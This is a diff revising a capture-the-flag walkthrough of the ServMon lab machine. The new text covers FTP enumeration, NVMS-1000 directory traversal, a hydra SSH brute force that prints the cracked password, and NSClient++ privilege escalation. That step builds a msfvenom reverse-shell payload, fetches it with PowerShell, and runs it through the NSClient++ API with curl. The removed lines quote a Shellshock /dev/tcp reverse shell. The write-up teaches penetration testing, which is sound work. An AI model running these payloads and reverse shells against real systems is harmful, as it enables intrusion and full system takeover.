@@ -102,28 +102,54 @@ Name (10.10.10.184:root): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
-Remote system type is Windows_NT.
-ftp> dir
-200 PORT command successful.
-125 Data connection already open; Transfer starting.
-01-18-20  12:05PM       <DIR>          Users
-226 Transfer complete.
-ftp> cd Users
+<SNIP>
+ftp> cd Nadine
 250 CWD command successful.
 ftp> dir
 200 PORT command successful.
 125 Data connection already open; Transfer starting.
-01-18-20  12:06PM       <DIR>          Nadine
-01-18-20  12:08PM       <DIR>          Nathan
+01-18-20  12:08PM                  174 Confidential.txt
+226 Transfer complete.
+ftp> get Confidential.txt
+<SNIP>
 ```
 
-Now, other than getting two usernames, we also know the file path to Nathan's password file. Let's hope it's still there when we get to it.
+After browsing, we find `Confidential.txt` in Nadine's directory and downloaded it with FTP.
+
+```
+# cat Confidential.txt 
+Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+
+Regards
+
+Nadine
+```
+
+Now, other than getting two possible usernames, we also know the file path to Nathan's password file. 
+
+Let's hope it's still there when we get to it.
 
 ## Exploiting NVMS Directory Traversal
 
-![bug](images/shocker/dontbugme.jpg)
+[NVMS-1000](http://en.tvt.net.cn/products/188.html) is a monitoring client for network video surveillance.
 
-Now, we have the passwords from Nathan's password file.
+![NVMS-1000](images/servmon/nvms.png)
+
+It is vulnerable to a [directory traversal attack](https://www.exploit-db.com/exploits/47774). Using the information in the PoC, we can carry out the attack with Burp.
+
+First, let's test if the installation is vulnerable.
+
+![Testing for traversal](images/servmon/testdirectory.png)
+
+Looking at the response, the attack succeeded.
+
+Now, let try to recover Nathan's password file from his desktop.
+
+![Getting password file](images/servmon/passwordfile.png)
+
+This password file contains seven passwords.
 
 ## Bruteforcing SSH
 
@@ -149,7 +175,18 @@ Gr4etN3w5w17hMySk1Pa5$
 ```
 
 We can use these information to bruteforce the SSH service with hydra.
-case sensitive?
+
+```
+# hydra -l nadine -P nathanpasswords 10.10.10.184 -t 4 ssh
+
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+<SNIP>
+[DATA] attacking ssh://10.10.10.184:22/
+[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
+<SNIP>
+```
+
+We find a set of SSH crecentials. With it, we can log into nadine's account.
 
 ```
 Microsoft Windows [Version 10.0.18363.752]
@@ -163,57 +200,94 @@ Here, you can find the user flag.
 
 ## Privilege Escalation Through NSClient++ Vulnerability
 
-First, let's setup a listener for catching our reverse shell.
+Our initial port scan revealed that NSClient++ is running at port 8443.
 
-`nc -nvlp 8888`
+[NSClient++](https://docs.nsclient.org/) is a monitoring daemon that allows enables integration with a remote monitoring server.
 
-Then, send another request for user.sh with the header value modified as:
+A search on exploitdb shows that [NSClient++ 0.5.2.35 has a privilege escaltion vulnerability](https://www.exploit-db.com/exploits/46802).
 
-`() { :;}; /bin/bash -i >& /dev/tcp/10.10.X.X/8888 0>&1`
-
-This will get a bash reverse shell, which is the natural choice here as bash is available. Note that `echo;` is not needed here because we are not interested in the HTML response.
-
-### Getting WebUI Password
+Let's find out if the installed version is vunerable.
 
 ```
-root@kali:~# nc -nvlp 8888
-listening on [any] 8888 ...
-connect to [10.10.X.X] from (UNKNOWN) [10.10.10.56] 58462
-bash: no job control in this shell
-shelly@Shocker:/usr/lib/cgi-bin$ cd ~
-cd ~
-shelly@Shocker:/home/shelly$ ls
-ls
-user.txt
-shelly@Shocker:/home/shelly$ cat user.txt
-cat user.txt
+nadine@SERVMON c:\Program Files\NSClient++>type changelog.txt
+2018-01-18 Michael Medin
+ * Fixed some Op5Client issues
+ <SNIP>
+ ```
+
+ * The latest entry in the changelog.txt was on 18 Jan 2018.
+
+ * According to [this page](https://nsclient.org/download/), the vulnerable version was released on 29 Jan 2018.
+
+Since the version installed is older than the vulnerable version, it is possible that the vulnerability exists.
+
+### How The Exploit Works
+
+NSClient++ allows external scripts to run on a schedule. This is to facilitate the automation of monitoring tasks.
+
+* The idea behind this exploit is to upload a malicious script and let NSClient++ execute it.
+
+* The [documentation](https://docs.nsclient.org/tutorial/) states that NSClient++ runs as Local System by default.
+
+* Hence, if the script pushes a shell to our handler, we can obtain an elevated shell.
+
+### Exploiting NSClient++ With API
+
+The steps:
+
+1. Get web password
+2. Enable external scripts and scheduler
+3. Add a new script pointing to malicious payload
+4. Get NSClient++ to execute it
+
+By [printing the configuration](https://support.itrsgroup.com/hc/en-us/articles/360020252193-How-to-configure-NSClient-from-the-Windows-command-prompt-), we can obtain the **password** and also verify that **external scripts and scheduler are enabled**.
+
 ```
-Try to access
+nadine@SERVMON c:\Program Files\NSClient++>nscp settings --list
+<SNIP>
+/modules.CheckExternalScripts=enabled
+<SNIP>
+/modules.Scheduler=enabled
+<SNIP>
+/settings/default.allowed hosts=127.0.0.1
+/settings/default.password=ew2x6SsGTxjRwXOT
+<SNIP>
+```
 
-### Checking Configuration
+We also note that the allowed hosts point to **local host**. This means that we need to exploit locally or perform port forwarding.
 
-[Fantastic but more technical explanation here](https://hypothetical.me/post/reverse-shell-in-bash/)
+Since, we do not have access to the GUI locally, let's try using the [API](https://docs.nsclient.org/api/rest/scripts/) to complete the attack. `curl` is conveniently installed on Servmon.
 
-`/bin/bash -i >& /dev/tcp/10.10.X.X/8888 0>&1`
+First, let's prepare a batch file **payload** with msfvenom.
 
-* `/bin/bash` - getting a new bash session
+`# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.X.X LPORT=8888 -f bat > sorryforthis.bat`
 
-Show can curl locally
+Then, infiltate it.
 
-### Exploiting With API
+`nadine@SERVMON c:\Temp>powershell -c "Invoke-WebRequest -Uri http://10.10.X.X:8000/sorryforthis.bat -OutFile c:\temp\sorryforthis.bat`
 
-Prepare a batch file payload with msfvenom.
+Now, let's define a **script** pointing to our payload. The `-k` flag is needed to run insecure connections over SSL.
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8888 -f bat > payload.bat`
+```
+nadine@SERVMON c:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/sorryforthis.bat 
+--data-binary @sorryforthis.bat
+Added sorryforthis as scripts\sorryforthis.bat
+```
 
-## Privilege Escalation
+Finally, we **execute** it (in the form of a [query](https://docs.nsclient.org/api/rest/queries/)) directly rather than setting a schedule to do it.
+
+```
+nadine@SERVMON c:\Temp>curl -s -k -u admin:ew2x6SsGTxjRwXOT "https://localhost:8443/api/v1/queries/sorryforthis/commands/execute"
+{"command":"sorryforthis","lines":[{"message":"Command sorryforthis didn't terminate within the timeout period 60s","perf":{}}],"resul
+t":3}
+```
 
 After executing the script, we get a system shell.
 
 ```
-root@kali:~# nc -nvlp 8888
+# nc -nvlp 8888
 listening on [any] 8888 ...
-connect to [10.10.14.3] from (UNKNOWN) [10.10.10.184] 49694
+connect to [10.10.X.X] from (UNKNOWN) [10.10.10.184] 49694
 Microsoft Windows [Version 10.0.18363.752]
 (c) 2019 Microsoft Corporation. All rights reserved.
 
@@ -222,14 +296,8 @@ whoami
 nt authority\system
 ```
 
-# Ending Thoughts
+# Thoughts
 
-I got to try out local port forwarding with this box. However, you don't need it if you're exploiting via the API.
+I also tried out local port forwarding with this box. You will need it if you want to exploit via the GUI or if curl is not available on the victim machine.
 
-**References**
-
-* https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/
-* https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability
-* https://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/#gref
-* https://blog.knapsy.com/blog/2014/10/07/basic-shellshock-exploitation/
-* https://github.com/opsxcq/exploit-CVE-2014-6271
+However, you don't need it if you're exploiting locally via the API.
